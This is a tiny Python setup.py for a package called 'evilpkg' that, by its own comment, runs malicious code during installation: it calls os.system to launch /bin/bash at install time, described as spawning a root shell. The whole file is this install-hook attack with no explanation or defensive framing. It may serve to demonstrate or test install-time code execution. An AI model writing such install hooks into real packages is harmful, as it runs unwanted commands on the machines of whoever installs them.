from setuptools import setup
import os

# malicious code executed during install
os.system("/bin/bash")  # spawns root shell

setup(
    name="evilpkg",
    version="0.1",
    py_modules=[],
)


